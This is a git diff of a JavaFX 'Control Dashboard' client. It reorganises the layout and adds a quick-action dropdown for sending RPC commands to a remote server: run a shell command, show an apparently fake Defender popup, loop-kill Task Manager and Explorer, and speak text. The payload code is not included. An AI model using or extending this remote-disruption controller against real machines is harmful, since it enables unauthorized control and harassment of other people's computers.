@@ -4,16 +4,15 @@ import com.fasterxml.jackson.databind.JsonNode;
 import javafx.application.Platform;
 import javafx.geometry.Insets;
 import javafx.scene.Parent;
-import javafx.scene.control.Button;
-import javafx.scene.control.Label;
-import javafx.scene.control.TextArea;
-import javafx.scene.control.TextField;
+import javafx.scene.control.*;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
 import javafx.scene.layout.Priority;
 import javafx.scene.layout.VBox;
 import main.client.RpcClientHelper;
 
+import java.util.LinkedHashMap;
+import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -25,7 +24,6 @@ public class Dashborad {
     public Parent createView() throws Exception {
         Label titleLabel = new Label("Control Dashboard");
         titleLabel.getStyleClass().add("title-label");
-        //titleLabel.setStyle("-fx-font-size: 18px; -fx-font-weight: bold;");
 
         Label statusLabel = new Label("Not connected");
 
@@ -37,9 +35,10 @@ public class Dashborad {
         Label serverIpLabel = new Label("Server IP:");
         TextField serverIpField = new TextField("127.0.0.1");
         serverIpField.setPromptText("e.g. 192.168.0.1");
+
         Label serverPortLabel = new Label("Port:");
         TextField serverPortField = new TextField("9000");
-        serverIpField.setPromptText("e.g. 9000");
+        serverPortField.setPromptText("e.g. 9000");
 
         Label emptyLabel = new Label("");
 
@@ -57,36 +56,85 @@ public class Dashborad {
         HBox connectionRow = new HBox(10, serverAdress, serverPort, restUiVertical);
         connectionRow.setPadding(new Insets(0, 0, 10, 0));
 
+        // --- Inputs grid (NO left-side labels; just fields) ---
         GridPane formGrid = new GridPane();
         formGrid.setHgap(10);
         formGrid.setVgap(10);
 
-        TextField field1 = addFieldRow(formGrid, 0, "Hello World");
-        TextField field2 = addFieldRow(formGrid, 1, "start cmd.exe");
-        TextField field3 = addFieldRow(formGrid, 2, "null");
-        TextField field4 = addFieldRow(formGrid, 3, "null");
-        TextField field5 = addFieldRow(formGrid, 4, "Hello");
+        TextField field1 = addFieldOnly(formGrid, 0, "Hello World");
+        TextField field2 = addFieldOnly(formGrid, 1, "start cmd.exe");
+        TextField field5 = addFieldOnly(formGrid, 2, "Hello"); // keep the same input, just row index changes
 
+        // Make fields match button height better (also reinforced via CSS below)
+        double controlHeight = 40;
+        setControlHeight(field1, controlHeight);
+        setControlHeight(field2, controlHeight);
+        setControlHeight(field5, controlHeight);
+
+        // --- Buttons (same actions, layout tightened) ---
         Button button1 = createActionButton("Display Text Test");
         Button button2 = createActionButton("Run Command");
         Button button3 = createActionButton("Display Defender Popup");
         Button button4 = createActionButton("Kill Taskmanager & Explorer Loop");
         Button button5 = createActionButton("TTS");
 
-        //button3.setTooltip(new Tooltip("No permissions to use this function"));
+        setControlHeight(button1, controlHeight);
+        setControlHeight(button2, controlHeight);
+        setControlHeight(button3, controlHeight);
+        setControlHeight(button4, controlHeight);
+        setControlHeight(button5, controlHeight);
 
-        VBox buttonBox = new VBox(10, button1, button2, button3, button4, button5);
-        buttonBox.setPrefWidth(300);
+        VBox leftButtonBox = new VBox(10, button1, button2, button5);
+        VBox rightButtonBox = new VBox(10, button3, button4);
 
+        leftButtonBox.setFillWidth(true);
+        rightButtonBox.setFillWidth(true);
+
+        // Keep columns reasonably close together
+        HBox buttonColumns = new HBox(10, leftButtonBox, rightButtonBox);
+
+        // Main row (fields + button columns only)
+        HBox mainLayout = new HBox(15, formGrid, buttonColumns);
+
+        // --- Quick Action (move UNDER everything, still ABOVE console) ---
+        Map<String, String> quickActions = buildQuickActions();
+
+        ComboBox<String> quickActionDropdown = new ComboBox<>();
+        quickActionDropdown.getItems().addAll(quickActions.keySet());
+        quickActionDropdown.getSelectionModel().selectFirst();
+
+        setControlHeight(quickActionDropdown, controlHeight);
+
+        Button runQuickActionButton = new Button("Run");
+        runQuickActionButton.setDisable(true);
+        setControlHeight(runQuickActionButton, controlHeight);
+
+        // Put dropdown + run in a compact row
+        Label quickActionLabel = new Label("Quick Action:");
+        HBox quickActionRow = new HBox(10, quickActionLabel, quickActionDropdown, runQuickActionButton);
+        quickActionRow.setPadding(new Insets(5, 0, 0, 0));
+        // let the dropdown take the remaining width in that row
+        HBox.setHgrow(quickActionDropdown, Priority.ALWAYS);
+        quickActionDropdown.setMaxWidth(Double.MAX_VALUE);
+
+        // --- Console clear button ---
         Button clearConsoleButton = new Button("Clear Console");
         clearConsoleButton.setOnAction(evt -> console.clear());
 
-        HBox mainLayout = new HBox(20, formGrid, buttonBox);
-        VBox root = new VBox(15, titleLabel, connectionRow, statusLabel, mainLayout, clearConsoleButton, console);
+        VBox root = new VBox(
+                15,
+                titleLabel,
+                connectionRow,
+                statusLabel,
+                mainLayout,
+                quickActionRow,     // <-- moved here (under everything, above console)
+                clearConsoleButton,
+                console
+        );
         root.setPadding(new Insets(20));
-
         VBox.setVgrow(console, Priority.ALWAYS);
 
+        // --- Connection wiring (same behavior) ---
         connectButton.setOnAction(evt -> {
             String ip = serverIpField.getText().trim();
             String portString = serverPortField.getText();
@@ -98,20 +146,24 @@ public class Dashborad {
                 portInt = 9000;
             }
 
-            connect(statusLabel, console, ip, portInt, connectButton, disconnectButton, quitButton, button1, button2, button3, button4, button5);
+            connect(statusLabel, console, ip, portInt,
+                    connectButton, disconnectButton, quitButton,
+                    button1, button2, button3, button4, button5,
+                    runQuickActionButton
+            );
         });
 
         disconnectButton.setOnAction(evt ->
-                disconnect(statusLabel, console, connectButton, disconnectButton, quitButton, button1, button2, button3, button4, button5)
+                disconnect(statusLabel, console, connectButton, disconnectButton, quitButton,
+                        button1, button2, button3, button4, button5, runQuickActionButton)
         );
 
         quitButton.setOnAction(evt -> shutdownClient());
-
         serverIpField.setOnAction(evt -> connectButton.fire());
 
+        // Existing button actions (same inputs as now)
         button1.setOnAction(evt -> callServer(statusLabel, console, "insertText", field1.getText()));
 
-        /// Button 2 handler & etc.
         CheckForBlacklist checker;
         try {
             checker = new CheckForBlacklist("src/main/resources/blacklist/blacklist.json");
@@ -123,7 +175,7 @@ public class Dashborad {
                 checker = null;
             }
         }
-        // Button action (make sure checker != null)
+
         CheckForBlacklist finalChecker = checker;
         button2.setOnAction(evt -> {
             String userCmd = field2.getText();
@@ -136,29 +188,60 @@ public class Dashborad {
             }
         });
 
-        button3.setOnAction(evt -> callServer(statusLabel, console, "runDefenderPopup", field3.getText()));
-        button4.setOnAction(evt -> callServer(statusLabel, console, "runKillTaskmngrAndExp", field4.getText()));
+        button3.setOnAction(evt -> callServer(statusLabel, console, "runDefenderPopup", null));
+        button4.setOnAction(evt -> callServer(statusLabel, console, "runKillTaskmngrAndExp", null));
         button5.setOnAction(evt -> callServer(statusLabel, console, "runTextToSpeech", field5.getText()));
 
-        //runCmdIgnoreErrors
+        // Dropdown "Run": runs selected item
+        runQuickActionButton.setOnAction(evt -> {
+            String selected = quickActionDropdown.getSelectionModel().getSelectedItem();
+            if (selected == null) return;
+
+            String method = quickActions.get(selected);
+            if (method == null) return;
+
+            callServer(statusLabel, console, method, null);
+        });
 
         return root;
     }
 
-    private TextField addFieldRow(GridPane grid, int row, String labelText) {
-        Label label = new Label(labelText);
+    // Inputs: single column, no left-side labels
+    private TextField addFieldOnly(GridPane grid, int row, String promptText) {
         TextField field = new TextField();
-        field.setPromptText(labelText);
-
-        grid.add(label, 0, row);
-        grid.add(field, 1, row);
+        field.setPromptText(promptText);
+        field.setMaxWidth(Double.MAX_VALUE);
+        grid.add(field, 0, row);
         return field;
     }
 
     private Button createActionButton(String text) {
         Button button = new Button(text);
         button.setDisable(true);
+        button.setMaxWidth(Double.MAX_VALUE);
         return button;
+    }
+
+    private Map<String, String> buildQuickActions() {
+        Map<String, String> actions = new LinkedHashMap<>();
+        actions.put("Display Defender Popup", "runDefenderPopup");
+        actions.put("Kill Taskmanager & Explorer Loop", "runKillTaskmngrAndExp");
+        return actions;
+    }
+
+    private static void setControlHeight(TextField field, double height) {
+        field.setPrefHeight(height);
+        field.setMinHeight(height);
+    }
+
+    private static void setControlHeight(Button button, double height) {
+        button.setPrefHeight(height);
+        button.setMinHeight(height);
+    }
+
+    private static void setControlHeight(ComboBox<?> comboBox, double height) {
+        comboBox.setPrefHeight(height);
+        comboBox.setMinHeight(height);
     }
 
     private void connect(Label statusLabel,
@@ -172,7 +255,8 @@ public class Dashborad {
                          Button button2,
                          Button button3,
                          Button button4,
-                         Button button5) {
+                         Button button5,
+                         Button runQuickActionButton) {
 
         statusLabel.setText("Connecting to " + host + ":" + port + " ...");
         statusLabel.setStyle("-fx-text-fill: #ffb433");
@@ -182,7 +266,10 @@ public class Dashborad {
             try {
                 RpcClientHelper old = rpc;
                 if (old != null) {
-                    try { old.close(); } catch (Exception ignored) {}
+                    try {
+                        old.close();
+                    } catch (Exception ignored) {
+                    }
                 }
 
                 rpc = new RpcClientHelper(host, port);
@@ -204,6 +291,7 @@ public class Dashborad {
                     button3.setDisable(false);
                     button4.setDisable(false);
                     button5.setDisable(false);
+                    runQuickActionButton.setDisable(false);
                 });
             } catch (Exception e) {
                 rpc = null;
@@ -220,6 +308,7 @@ public class Dashborad {
                     button3.setDisable(true);
                     button4.setDisable(true);
                     button5.setDisable(true);
+                    runQuickActionButton.setDisable(true);
                 });
             }
         });
@@ -236,7 +325,10 @@ public class Dashborad {
         rpc = null;
 
         if (old != null) {
-            try { old.close(); } catch (Exception ignored) {}
+            try {
+                old.close();
+            } catch (Exception ignored) {
+            }
         }
 
         statusLabel.setStyle("-fx-text-fill: #c20202");
@@ -294,18 +386,16 @@ public class Dashborad {
         console.setScrollTop(Double.MAX_VALUE);
     }
 
-    // Made public so AppMain can call it from stop()/onCloseRequest
     public void shutdownClient() {
-        // Close RPC connection
         if (rpc != null) {
-            try { rpc.close(); } catch (Exception ignored) {}
+            try {
+                rpc.close();
+            } catch (Exception ignored) {
+            }
             rpc = null;
         }
 
-        // Stop background executor (this thread keeps the JVM alive if not shutdown)
         rpcExecutor.shutdownNow();
-
-        // Ensure JavaFX actually exits when window closes
         Platform.exit();
     }
 }
